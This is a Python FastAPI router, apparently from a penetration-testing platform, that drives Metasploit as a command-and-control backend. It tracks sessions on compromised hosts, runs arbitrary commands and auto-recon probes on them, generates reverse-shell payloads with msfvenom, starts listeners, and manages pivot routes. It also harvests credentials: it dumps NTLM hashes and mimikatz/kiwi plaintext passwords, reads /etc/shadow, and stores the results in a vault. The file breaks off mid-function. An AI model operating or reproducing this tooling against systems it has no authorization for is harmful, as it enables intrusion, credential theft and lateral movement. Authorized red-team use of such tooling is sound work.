from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException
from fastapi.responses import Response as FastAPIResponse, StreamingResponse
from sqlalchemy.orm import Session as DBSession
from pydantic import BaseModel
from typing import Optional
import json
import uuid
from datetime import datetime

from database import get_db, AppSetting, C2Session, LootEntry, C2Task, Target, Project
import services.msf_client as msf


# ── Post-exploitation helpers ─────────────────────────────────────────────────

_DEFAULT_CHECKLIST = [
    {"id": "sysinfo",       "category": "recon",       "label": "System info (sysinfo / uname -a)",          "done": False, "done_at": None},
    {"id": "whoami",        "category": "recon",       "label": "Current user (getuid / whoami)",             "done": False, "done_at": None},
    {"id": "processes",     "category": "recon",       "label": "Process list (ps)",                          "done": False, "done_at": None},
    {"id": "network",       "category": "recon",       "label": "Network interfaces (ifconfig / ipconfig)",   "done": False, "done_at": None},
    {"id": "routes",        "category": "recon",       "label": "Routing table",                              "done": False, "done_at": None},
    {"id": "local_users",   "category": "recon",       "label": "Local users / passwd",                      "done": False, "done_at": None},
    {"id": "hashdump",      "category": "creds",       "label": "Dump password hashes",                      "done": False, "done_at": None},
    {"id": "kiwi",          "category": "creds",       "label": "Mimikatz / kiwi creds_all",                 "done": False, "done_at": None},
    {"id": "privesc",       "category": "escalation",  "label": "Local exploit suggester",                   "done": False, "done_at": None},
    {"id": "screenshot",    "category": "evidence",    "label": "Screenshot (meterpreter)",                   "done": False, "done_at": None},
    {"id": "persist_check", "category": "persistence", "label": "Cron / scheduled tasks check",              "done": False, "done_at": None},
    {"id": "pivot_check",   "category": "lateral",     "label": "Identify pivot opportunities",              "done": False, "done_at": None},
]

def _tick_checklist(session: C2Session, item_ids: list, db) -> None:
    """Mark checklist items as done if not already ticked."""
    if not session.checklist_json:
        session.checklist_json = json.dumps(_DEFAULT_CHECKLIST)
    items = json.loads(session.checklist_json)
    now = datetime.utcnow().isoformat()
    changed = False
    for item in items:
        if item["id"] in item_ids and not item["done"]:
            item["done"] = True
            item["done_at"] = now
            changed = True
    if changed:
        session.checklist_json = json.dumps(items)


# Maps post module paths to the checklist item IDs they satisfy
_MODULE_CHECKLIST_MAP: dict[str, list] = {
    "post/multi/recon/local_exploit_suggester":             ["privesc"],
    "post/linux/gather/hashdump":                           ["hashdump"],
    "post/windows/gather/hashdump":                         ["hashdump"],
    "post/windows/gather/credentials/credential_collector": ["kiwi"],
    "post/linux/gather/enum_system":                        ["sysinfo", "whoami", "local_users"],
    "post/windows/gather/enum_system":                      ["sysinfo", "whoami"],
    "post/linux/gather/enum_network":                       ["network", "routes"],
    "post/windows/gather/enum_logged_on_users":             ["local_users"],
    "post/linux/manage/sshkey_persistence":                 ["persist_check"],
    "post/windows/manage/enable_rdp":                       ["persist_check"],
}


_AUTO_PROBE_COMMANDS: dict[str, list[str]] = {
    "meterpreter_linux":   ["sysinfo", "getuid", "getpid", "ifconfig", "route"],
    "meterpreter_windows": ["sysinfo", "getuid", "getpid", "ipconfig", "route print"],
    "meterpreter_osx":     ["sysinfo", "getuid", "getpid", "ifconfig", "route -n get default"],
    "shell_linux":         ["uname -a", "id", "whoami", "ifconfig 2>/dev/null || ip a", "netstat -rn 2>/dev/null || ip route"],
    "shell_windows":       ["systeminfo | findstr /C:\"OS\" /C:\"Host\"", "whoami /all", "ipconfig /all", "route print"],
    "shell_default":       ["uname -a 2>/dev/null; id; whoami; ifconfig 2>/dev/null || ip a"],
}

def _probe_commands(session_type: str, platform: str) -> list[str]:
    key = f"{session_type}_{platform}" if f"{session_type}_{platform}" in _AUTO_PROBE_COMMANDS else \
          f"shell_{'windows' if 'win' in platform.lower() else 'linux'}" if "shell" in session_type else "meterpreter_linux"
    return _AUTO_PROBE_COMMANDS.get(key, _AUTO_PROBE_COMMANDS["shell_default"])


def _get_setting(db: DBSession, key: str, default: str) -> str:
    row = db.query(AppSetting).filter(AppSetting.key == key).first()
    return row.value if row else default


def _set_setting(db: DBSession, key: str, value: str) -> None:
    row = db.query(AppSetting).filter(AppSetting.key == key).first()
    if row:
        row.value = value
    else:
        db.add(AppSetting(key=key, value=value))


def _run_auto_probe(session_id: str, check_enabled: bool = False) -> None:
    """Background task: run initial recon commands on a new session.
    check_enabled=True is used for automatic triggers (respects the auto_postex_enabled setting).
    Manual button clicks pass check_enabled=False to always run.
    """
    from database import get_db as _get_db
    db = next(_get_db())
    try:
        session = db.query(C2Session).filter(C2Session.id == session_id).first()
        if not session or not session.msf_session_id:
            return
        if check_enabled and _get_setting(db, "auto_postex_enabled", "false") != "true":
            return

        commands = _probe_commands(session.session_type or "shell", session.platform or "linux")
        combined: list[str] = []
        for cmd in commands:
            try:
                out = msf.session_run_command(session.msf_session_id, cmd, timeout=15)
                combined.append(f"$ {cmd}\n{out}")
            except Exception:
                pass

        if combined:
            entry = LootEntry(
                id=str(uuid.uuid4()),
                session_id=session_id,
                loot_type="system_info",
                title="Auto-probe: initial recon",
                content="\n\n".join(combined),
                source_path="auto-probe",
                captured_at=datetime.utcnow(),
            )
            db.add(entry)
            session.last_seen = datetime.utcnow()
            # Auto-probe always covers sysinfo, whoami, network, and routes
            _tick_checklist(session, ["sysinfo", "whoami", "network", "routes"], db)
            db.commit()
    except Exception:
        pass
    finally:
        db.close()

router = APIRouter(prefix="/c2", tags=["c2"])


# ── MSF connection ────────────────────────────────────────────────

class ConnectRequest(BaseModel):
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = ""
    ssl: bool = False


@router.post("/connect")
def connect_msf(req: ConnectRequest):
    ok, err = msf.connect(host=req.host, port=req.port, password=req.password, ssl=req.ssl)
    if not ok:
        raise HTTPException(503, f"Could not connect to Metasploit RPC: {err}")
    return msf.get_status()


@router.post("/disconnect")
def disconnect_msf():
    msf.disconnect()
    return {"connected": False}


@router.get("/status")
def get_msf_status():
    return msf.get_status()


# ── Sessions ──────────────────────────────────────────────────────

@router.get("/sessions")
def list_sessions(project_id: Optional[str] = None, db: DBSession = Depends(get_db)):
    """List Seraph-tracked sessions, optionally filtered by project."""
    query = db.query(C2Session)
    if project_id:
        query = query.filter(C2Session.project_id == project_id)
    sessions = query.order_by(C2Session.established_at.desc()).all()
    # Enrich with MSF live data
    live = {s["msf_session_id"]: s for s in msf.list_sessions()}
    result = []
    for s in sessions:
        d = {
            "id": s.id,
            "msf_session_id": s.msf_session_id,
            "session_type": s.session_type,
            "platform": s.platform,
            "arch": s.arch,
            "remote_host": s.remote_host,
            "remote_port": s.remote_port,
            "tunnel_peer": s.tunnel_peer,
            "via_exploit": s.via_exploit,
            "via_payload": s.via_payload,
            "status": s.status,
            "notes": s.notes,
            "established_at": s.established_at,
            "last_seen": s.last_seen,
            "project_id": s.project_id,
            "target_id": s.target_id,
            "loot_count": len(s.loot),
            "task_count": len(s.tasks),
            "live": s.msf_session_id in live,
            "sysinfo": json.loads(s.sysinfo_json) if s.sysinfo_json else None,
        }
        result.append(d)
    return result


@router.post("/sessions/sync")
def sync_msf_sessions(project_id: str, db: DBSession = Depends(get_db)):
    """Pull live sessions from MSF and create Seraph records for new ones."""
    live_sessions = msf.list_sessions()
    created = []
    for ls in live_sessions:
        existing = db.query(C2Session).filter(
            C2Session.msf_session_id == ls["msf_session_id"],
            C2Session.project_id == project_id,
        ).first()
        if not existing:
            # Try to match target by IP
            remote_host = ls.get("remote_host", "")
            target = None
            if remote_host:
                target = db.query(Target).filter(
                    Target.project_id == project_id,
                    Target.hostname_or_ip == remote_host,
                ).first()
            session = C2Session(
                id=str(uuid.uuid4()),
                project_id=project_id,
                target_id=target.id if target else None,
                msf_session_id=ls["msf_session_id"],
                session_type=ls.get("session_type", "shell"),
                platform=ls.get("platform", ""),
                arch=ls.get("arch", ""),
                remote_host=remote_host,
                remote_port=ls.get("remote_port", ""),
                tunnel_peer=ls.get("tunnel_peer", ""),
                via_exploit=ls.get("via_exploit", ""),
                via_payload=ls.get("via_payload", ""),
                status="active",
                checklist_json=json.dumps(_DEFAULT_CHECKLIST),
            )
            db.add(session)
            created.append(session.id)
    db.commit()
    return {"synced": len(live_sessions), "created": len(created)}


class CreateSessionRequest(BaseModel):
    project_id: str
    target_id: Optional[str] = None
    msf_session_id: Optional[str] = None
    session_type: str = "meterpreter"
    remote_host: str = ""
    remote_port: str = ""
    via_exploit: str = ""
    via_payload: str = ""
    platform: str = ""
    arch: str = ""
    notes: str = ""


@router.post("/sessions")
def create_session(req: CreateSessionRequest, background: BackgroundTasks, db: DBSession = Depends(get_db)):
    session = C2Session(
        id=str(uuid.uuid4()),
        project_id=req.project_id,
        target_id=req.target_id,
        msf_session_id=req.msf_session_id,
        session_type=req.session_type,
        remote_host=req.remote_host,
        remote_port=req.remote_port,
        via_exploit=req.via_exploit,
        via_payload=req.via_payload,
        platform=req.platform,
        arch=req.arch,
        notes=req.notes,
        status="active",
        checklist_json=json.dumps(_DEFAULT_CHECKLIST),
    )
    db.add(session)
    db.commit()
    db.refresh(session)
    if req.msf_session_id:
        background.add_task(_run_auto_probe, session.id, True)  # check_enabled=True for auto trigger
    return session


@router.patch("/sessions/{session_id}/status")
def update_session_status(session_id: str, status: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if status not in ("active", "inactive", "lost"):
        raise HTTPException(400, "Invalid status")
    session.status = status
    db.commit()
    return {"id": session_id, "status": status}


@router.delete("/sessions/{session_id}")
def delete_session(session_id: str, kill: bool = False, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if kill and session.msf_session_id:
        msf.kill_session(session.msf_session_id)
    db.delete(session)
    db.commit()
    return {"deleted": session_id}


# ── Commands / Tasks ──────────────────────────────────────────────

class RunCommandRequest(BaseModel):
    command: str
    timeout: int = 30


@router.post("/sessions/{session_id}/exec")
def run_session_command(session_id: str, req: RunCommandRequest, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")

    command = req.command.strip()
    if not command:
        raise HTTPException(400, "Empty command")

    task = C2Task(
        id=str(uuid.uuid4()),
        session_id=session_id,
        command=command,
        status="running",
        executed_at=datetime.utcnow(),
    )
    db.add(task)
    db.commit()

    output = msf.session_run_command(session.msf_session_id, command, timeout=req.timeout)

    task.output = output
    task.status = "done"
    task.completed_at = datetime.utcnow()
    session.last_seen = datetime.utcnow()
    db.commit()

    return {"task_id": task.id, "output": output, "status": "done"}


@router.get("/sessions/{session_id}/tasks")
def get_session_tasks(session_id: str, db: DBSession = Depends(get_db)):
    tasks = db.query(C2Task).filter(C2Task.session_id == session_id).order_by(C2Task.executed_at).all()
    return tasks


# ── Post-exploitation modules ─────────────────────────────────────

@router.get("/post-modules")
def get_post_modules(platform: str = "multi"):
    from services.msf_client import POST_MODULES
    return POST_MODULES.get(platform, POST_MODULES["multi"])


class RunPostModuleRequest(BaseModel):
    session_id: str       # Seraph session ID
    module_name: str
    options: dict = {}


@router.post("/post-modules/run")
def run_post_module(req: RunPostModuleRequest, db: DBSession = Depends(get_db)):
    import re
    session = db.query(C2Session).filter(C2Session.id == req.session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "No MSF session ID")
    if not re.match(r'^post/[\w/]+$', req.module_name):
        raise HTTPException(400, "Invalid module name")

    opts = {"SESSION": int(session.msf_session_id)}
    for k, v in req.options.items():
        if re.match(r'^\w+$', str(k)):
            opts[k] = v

    def stream():
        import time
        client = msf.get_client()
        if not client:
            yield "data: [Error] Not connected to Metasploit\n\n"
            return

        sessions_before = set(client.sessions.list.keys()) if isinstance(client.sessions.list, dict) else set()
        con = None
        try:
            con = client.consoles.console()
            time.sleep(0.5)
            con.read()

            con.write(f"use {req.module_name}\n")
            time.sleep(0.3); con.read()
            con.write(f"set SESSION {int(session.msf_session_id)}\n")
            time.sleep(0.1); con.read()
            con.write("run\n")

            deadline = time.time() + 600  # 10 min max
            idle = 0
            while time.time() < deadline:
                time.sleep(0.8)
                chunk = con.read()
                data = chunk.get("data", "") if isinstance(chunk, dict) else ""
                if data:
                    for line in data.splitlines():
                        if line.strip():
                            yield f"data: {line}\n\n"
                    idle = 0
                else:
                    idle += 1
                    if not chunk.get("busy", True) and idle >= 2:
                        break

            # Check for new sessions
            new_sids = [sid for sid in (client.sessions.list or {}) if sid not in sessions_before]
            if new_sids:
                yield f"data: [+] New session opened: #{new_sids[0]}\n\n"
            # Auto-tick checklist items this module satisfies
            tick_ids = _MODULE_CHECKLIST_MAP.get(req.module_name, [])
            if tick_ids:
                try:
                    db.refresh(session)
                    _tick_checklist(session, tick_ids, db)
                    db.commit()
                except Exception:
                    pass
            yield "data: [DONE]\n\n"
        except Exception as e:
            yield f"data: [Error] {e}\n\n"
            yield "data: [DONE]\n\n"
        finally:
            if con:
                try: con.destroy()
                except Exception: pass

    return StreamingResponse(stream(), media_type="text/event-stream")


# ── Loot ──────────────────────────────────────────────────────────

@router.get("/sessions/{session_id}/loot")
def get_session_loot(session_id: str, db: DBSession = Depends(get_db)):
    return db.query(LootEntry).filter(LootEntry.session_id == session_id).order_by(LootEntry.captured_at.desc()).all()


@router.get("/loot")
def get_all_loot(project_id: Optional[str] = None, db: DBSession = Depends(get_db)):
    query = db.query(LootEntry)
    if project_id:
        query = query.join(C2Session).filter(C2Session.project_id == project_id)
    return query.order_by(LootEntry.captured_at.desc()).all()


class AddLootRequest(BaseModel):
    session_id: str
    loot_type: str = "credential"
    title: str
    content: str = ""
    source_path: str = ""


@router.post("/loot")
def add_loot(req: AddLootRequest, db: DBSession = Depends(get_db)):
    valid_types = {"credential", "hash", "file", "key", "secret", "system_info", "other"}
    if req.loot_type not in valid_types:
        raise HTTPException(400, "Invalid loot type")
    entry = LootEntry(
        id=str(uuid.uuid4()),
        session_id=req.session_id,
        loot_type=req.loot_type,
        title=req.title,
        content=req.content,
        source_path=req.source_path,
    )
    db.add(entry)
    db.commit()
    db.refresh(entry)
    return entry


@router.post("/loot/sync-msf")
def sync_msf_loot(session_id: str, db: DBSession = Depends(get_db)):
    """Pull loot from MSF DB and store as LootEntries."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    msf_loot = msf.get_loot(session.msf_session_id)
    created = 0
    for item in msf_loot:
        entry = LootEntry(
            id=str(uuid.uuid4()),
            session_id=session_id,
            loot_type=item.get("loot_type", "other"),
            title=item.get("name") or item.get("info") or "MSF Loot",
            content=item.get("data", ""),
            source_path=item.get("path", ""),
        )
        db.add(entry)
        created += 1
    db.commit()
    return {"synced": created}


@router.delete("/loot/{loot_id}")
def delete_loot(loot_id: str, db: DBSession = Depends(get_db)):
    entry = db.query(LootEntry).filter(LootEntry.id == loot_id).first()
    if not entry:
        raise HTTPException(404, "Loot entry not found")
    db.delete(entry)
    db.commit()
    return {"deleted": loot_id}


# ── Listeners ─────────────────────────────────────────────────────

class StartListenerRequest(BaseModel):
    payload: str
    lhost: str
    lport: int
    extra_opts: dict = {}


@router.post("/listeners/start")
def start_listener(req: StartListenerRequest):
    import re
    if not re.match(r'^[\w\.\-]+$', req.lhost):
        raise HTTPException(400, "Invalid LHOST")
    result = msf.start_listener(
        payload=req.payload,
        lhost=req.lhost,
        lport=req.lport,
        extra_opts=req.extra_opts,
    )
    if "error" in result:
        raise HTTPException(500, result["error"])
    return result


@router.get("/listeners")
def list_listeners():
    return msf.list_jobs()


@router.delete("/listeners/{job_id}")
def stop_listener(job_id: str):
    ok = msf.stop_job(job_id)
    if not ok:
        raise HTTPException(500, "Failed to stop listener")
    return {"stopped": job_id}


@router.delete("/jobs/all")
def stop_all_jobs():
    client = msf.get_client()
    if not client:
        raise HTTPException(503, "Not connected to Metasploit")
    jobs = client.jobs.list or {}
    stopped, failed = [], []
    for jid in list(jobs.keys()):
        try:
            client.jobs.stop(str(jid))
            stopped.append(str(jid))
        except Exception:
            failed.append(str(jid))
    return {"stopped": stopped, "failed": failed}


# ── Payload generation ────────────────────────────────────────────

COMMON_PAYLOADS = [
    {"value": "linux/x64/meterpreter/reverse_tcp", "label": "Linux x64 Meterpreter (TCP)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "linux/x86/meterpreter/reverse_tcp", "label": "Linux x86 Meterpreter (TCP)", "platform": "linux", "arch": "x86", "formats": ["elf", "raw"]},
    {"value": "linux/x64/shell/reverse_tcp", "label": "Linux x64 Shell (TCP)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "windows/x64/meterpreter/reverse_tcp", "label": "Windows x64 Meterpreter (TCP)", "platform": "windows", "arch": "x64", "formats": ["exe", "dll", "raw"]},
    {"value": "windows/meterpreter/reverse_tcp", "label": "Windows x86 Meterpreter (TCP)", "platform": "windows", "arch": "x86", "formats": ["exe", "dll", "raw"]},
    {"value": "windows/x64/shell/reverse_tcp", "label": "Windows x64 Shell (TCP)", "platform": "windows", "arch": "x64", "formats": ["exe", "raw"]},
    {"value": "osx/x64/meterpreter/reverse_tcp", "label": "macOS x64 Meterpreter (TCP)", "platform": "osx", "arch": "x64", "formats": ["macho", "raw"]},
    {"value": "php/meterpreter/reverse_tcp", "label": "PHP Meterpreter (TCP)", "platform": "php", "arch": "php", "formats": ["raw"]},
    {"value": "python/meterpreter/reverse_tcp", "label": "Python Meterpreter (TCP)", "platform": "python", "arch": "python", "formats": ["raw"]},
    {"value": "java/meterpreter/reverse_tcp", "label": "Java Meterpreter (TCP)", "platform": "java", "arch": "java", "formats": ["jar"]},
    {"value": "android/meterpreter/reverse_tcp", "label": "Android Meterpreter (TCP)", "platform": "android", "arch": "dalvik", "formats": ["apk"]},
    {"value": "linux/x64/meterpreter_reverse_https", "label": "Linux x64 Meterpreter (HTTPS)", "platform": "linux", "arch": "x64", "formats": ["elf", "raw"]},
    {"value": "windows/x64/meterpreter_reverse_https", "label": "Windows x64 Meterpreter (HTTPS)", "platform": "windows", "arch": "x64", "formats": ["exe", "raw"]},
]


@router.get("/payloads")
def list_payloads():
    return COMMON_PAYLOADS


class GeneratePayloadRequest(BaseModel):
    payload: str
    lhost: str
    lport: int
    format: str = "elf"
    arch: str = "x86_64"
    platform: str = "linux"
    encoder: str = "none"
    iterations: int = 1
    bad_chars: str = ""
    extra_opts: dict = {}
    auto_start_listener: bool = False  # If True, start MSF multi/handler after generation


@router.post("/payloads/generate")
def generate_payload(req: GeneratePayloadRequest):
    import re, shutil
    if not shutil.which("msfvenom"):
        raise HTTPException(503, "msfvenom not found. Install Metasploit Framework.")
    try:
        data = msf.generate_payload(
            payload=req.payload,
            lhost=req.lhost,
            lport=req.lport,
            fmt=req.format,
            arch=req.arch,
            platform=req.platform,
            encoder=req.encoder if req.encoder and req.encoder != "none" else None,
            iterations=req.iterations,
            bad_chars=req.bad_chars if req.bad_chars else None,
            extra_opts=req.extra_opts,
        )
    except ValueError as e:
        raise HTTPException(400, str(e))
    if data is None:
        raise HTTPException(500, "msfvenom failed to generate payload")

    # Auto-start a matching multi/handler listener if requested
    if req.auto_start_listener:
        try:
            _auto_start_handler(req.payload, req.lhost, req.lport)
        except Exception:
            pass  # Don't fail payload download if listener startup fails

    ext_map = {"elf": "elf", "exe": "exe", "dll": "dll", "raw": "bin", "php": "php", "python": "py", "jar": "jar", "apk": "apk", "macho": "macho", "bash": "sh"}
    ext = ext_map.get(req.format, "bin")
    payload_slug = req.payload.replace("/", "_")

    return FastAPIResponse(
        content=data,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="payload_{payload_slug}.{ext}"'},
    )


def _auto_start_handler(payload: str, lhost: str, lport: int) -> None:
    """
    Start a Metasploit multi/handler for the given payload if not already running.
    Called after successful msfvenom payload generation when auto_start_listener=True.
    """
    client = msf.get_client()
    if not client:
        return  # Not connected to MSF
    # Check if a handler for this payload+port is already running
    try:
        jobs = msf.list_jobs()
        for job in jobs:
            ds = job.get("datastore", {})
            if (ds.get("PAYLOAD") == payload and
                    str(ds.get("LPORT", "")) == str(lport)):
                return  # Already running
    except Exception:
        pass
    # Start new handler
    try:
        msf.start_listener(
            payload=payload,
            lhost=lhost,
            lport=lport,
        )
    except Exception:
        pass


# ── Run module ────────────────────────────────────────────────────────────────

class RunModuleRequest(BaseModel):
    module: str
    options: dict = {}
    payload: str = ""
    project_id: str = ""


@router.post("/run-module")
def run_module(req: RunModuleRequest, db: DBSession = Depends(get_db)):
    if not msf.get_client():
        raise HTTPException(503, "Not connected to Metasploit")

    result = msf.run_module(req.module, req.options, req.payload)

    if "error" in result:
        raise HTTPException(500, result["error"])

    # If a new session appeared and we have a project, persist it
    if result.get("new_session_id") and req.project_id:
        from database import C2Session
        sid = result["new_session_id"]
        info = result.get("new_session") or {}
        existing = db.query(C2Session).filter(C2Session.msf_session_id == str(sid)).first()
        if not existing:
            tunnel = info.get("tunnel_peer", "")
            remote_host = tunnel.split(":")[0] if ":" in tunnel else tunnel
            db.add(C2Session(
                id=str(uuid.uuid4()),
                msf_session_id=str(sid),
                project_id=req.project_id,
                session_type=info.get("type", "shell"),
                platform=info.get("platform", ""),
                arch=info.get("arch", ""),
                remote_host=remote_host,
                remote_port=tunnel.split(":")[1] if ":" in tunnel else "",
                tunnel_peer=tunnel,
                via_exploit=info.get("via_exploit", req.module),
                via_payload=info.get("via_payload", req.payload),
                status="active",
                established_at=datetime.utcnow(),
                last_seen=datetime.utcnow(),
            ))
            db.commit()

    return result


# ── Auto post-ex config ───────────────────────────────────────────────────────

class AutoPostexConfig(BaseModel):
    enabled: bool
    commands: Optional[list[str]] = None  # None = use defaults


@router.get("/auto-postex-config")
def get_auto_postex_config(db: DBSession = Depends(get_db)):
    enabled = _get_setting(db, "auto_postex_enabled", "false") == "true"
    return {"enabled": enabled}


@router.put("/auto-postex-config")
def save_auto_postex_config(req: AutoPostexConfig, db: DBSession = Depends(get_db)):
    _set_setting(db, "auto_postex_enabled", "true" if req.enabled else "false")
    db.commit()
    return {"ok": True}


@router.post("/sessions/{session_id}/auto-probe")
def run_session_auto_probe(session_id: str, background: BackgroundTasks, db: DBSession = Depends(get_db)):
    """Manually trigger auto-probe on a session (runs in background)."""
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")
    background.add_task(_run_auto_probe, session_id)
    return {"queued": True}


# ── Post-ex checklist ─────────────────────────────────────────────────────────

@router.get("/sessions/{session_id}/checklist")
def get_checklist(session_id: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.checklist_json:
        session.checklist_json = json.dumps(_DEFAULT_CHECKLIST)
        db.commit()
    return json.loads(session.checklist_json)


class ChecklistItemUpdate(BaseModel):
    done: bool


@router.patch("/sessions/{session_id}/checklist/{item_id}")
def update_checklist_item(session_id: str, item_id: str, req: ChecklistItemUpdate, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    items = json.loads(session.checklist_json or json.dumps(_DEFAULT_CHECKLIST))
    found = False
    for item in items:
        if item["id"] == item_id:
            item["done"] = req.done
            item["done_at"] = datetime.utcnow().isoformat() if req.done else None
            found = True
            break
    if not found:
        raise HTTPException(404, "Checklist item not found")
    session.checklist_json = json.dumps(items)
    db.commit()
    return items


@router.post("/sessions/{session_id}/checklist/reset")
def reset_checklist(session_id: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    session.checklist_json = json.dumps(_DEFAULT_CHECKLIST)
    db.commit()
    return json.loads(session.checklist_json)


# ── Credential harvesting ─────────────────────────────────────────────────────

@router.post("/sessions/{session_id}/harvest-creds")
def harvest_credentials(session_id: str, db: DBSession = Depends(get_db)):
    """
    Run hashdump and kiwi creds_all (meterpreter) or shadow/passwd dump (shell).
    Parses results into Credential Vault records and stores raw output as LootEntry.
    """
    import re as _re
    from database import Credential
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")

    is_meterpreter = "meterpreter" in (session.session_type or "")
    is_windows = "win" in (session.platform or "").lower()
    results: list[str] = []
    creds_saved = 0
    ticked: set = set()

    def _save_raw(title: str, content: str, loot_type: str = "hash") -> None:
        if content.strip():
            db.add(LootEntry(
                id=str(uuid.uuid4()),
                session_id=session_id,
                loot_type=loot_type,
                title=title,
                content=content,
                source_path="harvest-creds",
                captured_at=datetime.utcnow(),
            ))

    if is_meterpreter and is_windows:
        # hashdump
        out = msf.session_run_command(session.msf_session_id, "hashdump", timeout=30)
        if out:
            results.append(f"=== hashdump ===\n{out}")
            _save_raw("hashdump output", out)
            ticked.add("hashdump")
            # Parse NTLM lines: user:rid:lmhash:ntlmhash:::
            for line in out.splitlines():
                parts = line.strip().split(":")
                if len(parts) >= 4:
                    uname = parts[0]
                    ntlm = parts[3]
                    if _re.match(r'^[0-9a-fA-F]{32}$', ntlm):
                        db.add(Credential(
                            id=str(uuid.uuid4()),
                            project_id=session.project_id,
                            username=uname,
                            secret=ntlm,
                            cred_type="hash",
                            source="c2_loot",
                            target_host=session.remote_host or "",
                            notes=f"NTLM hash — harvested via hashdump from session {session.msf_session_id}",
                        ))
                        creds_saved += 1
        # kiwi
        kiwi_out = msf.session_run_command(session.msf_session_id, "load kiwi", timeout=15)
        if "success" in kiwi_out.lower() or "kiwi" in kiwi_out.lower():
            creds_out = msf.session_run_command(session.msf_session_id, "creds_all", timeout=30)
            if creds_out:
                results.append(f"=== kiwi creds_all ===\n{creds_out}")
                _save_raw("kiwi creds_all output", creds_out)
                ticked.add("kiwi")
                # Parse kiwi plaintext: Username  Domain  Password
                for line in creds_out.splitlines():
                    m = _re.match(r'\s*(\S+)\s+(\S+)\s+(\S+)\s*$', line)
                    if m and m.group(3) not in ("*", "n.a.", "(null)"):
                        db.add(Credential(
                            id=str(uuid.uuid4()),
                            project_id=session.project_id,
                            username=f"{m.group(2)}\\{m.group(1)}",
                            secret=m.group(3),
                            cred_type="password",
                            source="c2_loot",
                            target_host=session.remote_host or "",
                            notes=f"Harvested via kiwi from session {session.msf_session_id}",
                        ))
                        creds_saved += 1

    elif is_meterpreter and not is_windows:
        # Linux: read /etc/passwd and /etc/shadow
        for path, title in [("/etc/passwd", "passwd"), ("/etc/shadow", "shadow")]:
            cmd = f"cat {path}"
            out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
            if out and "No such file" not in out and "Permission denied" not in out:
                results.append(f"=== {path} ===\n{out}")
                _save_raw(f"{title} dump", out, loot_type="userlist" if title == "passwd" else "hash")
                if title == "passwd":
                    ticked.add("local_users")
                if title == "shadow":
                    for line in out.splitlines():
                        parts = line.strip().split(":")
                        if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "x", ""):
                            db.add(Credential(
                                id=str(uuid.uuid4()),
                                project_id=session.project_id,
                                username=parts[0],
                                secret=parts[1],
                                cred_type="hash",
                                source="c2_loot",
                                target_host=session.remote_host or "",
                                notes=f"Shadow hash — harvested via /etc/shadow from session {session.msf_session_id}",
                            ))
                            creds_saved += 1
                    ticked.add("hashdump")
    else:
        # Raw shell — run platform-appropriate commands
        cmds = ["cat /etc/passwd 2>/dev/null", "cat /etc/shadow 2>/dev/null",
                "find / -name '*.txt' -path '*/password*' 2>/dev/null | head -5"]
        for cmd in cmds:
            out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
            if out and out.strip():
                results.append(f"$ {cmd}\n{out}")
                _save_raw(cmd, out, loot_type="userlist" if "passwd" in cmd else "hash")
                if "passwd" in cmd:
                    ticked.add("local_users")
                if "shadow" in cmd:
                    ticked.add("hashdump")
                    for line in out.splitlines():
                        parts = line.strip().split(":")
                        if len(parts) >= 2 and parts[1] and parts[1] not in ("*", "!", "x", ""):
                            db.add(Credential(
                                id=str(uuid.uuid4()),
                                project_id=session.project_id,
                                username=parts[0],
                                secret=parts[1],
                                cred_type="hash",
                                source="c2_loot",
                                target_host=session.remote_host or "",
                                notes=f"Shadow hash — harvested via /etc/shadow from session {session.msf_session_id}",
                            ))
                            creds_saved += 1

    session.last_seen = datetime.utcnow()
    if ticked:
        _tick_checklist(session, list(ticked), db)
    db.commit()
    return {
        "creds_saved": creds_saved,
        "output": "\n\n".join(results) if results else "No credentials found or session type unsupported.",
    }


# ── Pivot routes ──────────────────────────────────────────────────────────────

class AddRouteRequest(BaseModel):
    subnet: str      # e.g. "10.10.10.0"
    netmask: str     # e.g. "255.255.255.0"


@router.get("/sessions/{session_id}/routes")
def get_routes(session_id: str, db: DBSession = Depends(get_db)):
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    return json.loads(session.pivot_routes_json or "[]")


@router.post("/sessions/{session_id}/routes")
def add_route(session_id: str, req: AddRouteRequest, db: DBSession = Depends(get_db)):
    import re as _re
    if not _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', req.subnet):
        raise HTTPException(400, "Invalid subnet")
    if not _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', req.netmask):
        raise HTTPException(400, "Invalid netmask")
    session = db.query(C2Session).filter(C2Session.id == session_id).first()
    if not session:
        raise HTTPException(404, "Session not found")
    if not session.msf_session_id:
        raise HTTPException(400, "Session has no MSF session ID")

    routes = json.loads(session.pivot_routes_json or "[]")
    # Try to add route in MSF
    msf_out = ""
